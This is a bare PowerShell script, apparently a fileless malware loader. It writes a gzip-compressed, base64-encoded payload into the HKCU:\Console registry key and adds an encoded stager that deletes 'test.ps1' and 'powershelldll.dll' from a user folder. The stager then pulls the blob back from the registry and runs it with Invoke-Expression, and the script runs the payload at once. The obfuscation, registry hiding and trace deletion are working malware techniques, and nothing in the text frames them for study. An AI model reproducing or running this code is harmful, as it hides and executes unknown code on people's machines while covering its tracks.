$code = "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"
Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;

$base64 = "cgBlAG0AbwB2AGUALQBpAHQAZQBtACAALQBwAGEAdABoACAAKABKAG8AaQBuAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAHAAaABhAG0AcAAgACcAdABlAHMAdAAuAHAAcwAxACcAKQAgAC0AZgBvAHIAYwBlADsAIAByAGUAbQBvAHYAZQAtAGkAdABlAG0AIAAtAHAAYQB0AGgAIAAoAEoAbwBpAG4ALQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAcABoAGEAbQBwACAAJwBwAG8AdwBlAHIAcwBoAGQAbABsAC4AZABsAGwAJwApACAALQBmAG8AcgBjAGUAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAZwBwACAAJwBIAEsAQwBVADoAXABDAG8AbgBzAG8AbABlACcAKQAuAEMAbwBuAHQAZQBuAHQAUwBjAHIAaQBwAHQAKQApACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA="
Set-ItemProperty "HKCU:\Console\" -Name EScript -Value $base64;

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($code));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
